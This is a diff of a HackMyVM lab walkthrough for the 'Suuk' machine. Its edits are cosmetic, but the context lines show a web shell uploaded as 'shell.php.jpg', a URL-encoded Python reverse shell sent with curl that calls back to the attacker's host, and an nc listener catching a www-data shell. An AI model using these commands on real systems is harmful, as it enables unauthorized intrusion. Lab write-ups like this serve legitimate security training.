@@ -50,7 +50,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds
 ```
 We can see that our target runs an SSH and a Web server on ports 22 and 80 respectively. Upon visiting this web application we are greeted with an upload form that accepts only image files.
-![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-suuk/1-browse.png)
+![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-suuk/1-browse.png){: .center}
 
 Let's first skip this form and fuzz the web application to uncover any hidden file or directory.
 ```bash
@@ -106,7 +106,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 └─$curl http://10.0.2.13/upload/shell.php.jpg?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.0.2.9%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27
 ```
 
-When we go back to our listener, we will notice a connection from our target.
+When we go back to the listener, we will notice a connection from our target.
 ```bash
 ┌──(pentester㉿kali)-[~/Suuk/Scans/Service]
 └─$nc -lvnp 1234                                  
@@ -118,7 +118,7 @@ www-data
 www-data@kuus:/var/www/html/upload$ 
 ```
 
-With this access, we can start internal enumeration of the target's system. We will notice www-data's .bash_history file in the web root directory.
+With this access, we can start internal enumeration of the target's system. We will notice the www-data's .bash_history file in the web root directory.
 ```bash
 www-data@kuus:/var/www$ ls -la
 ls -la
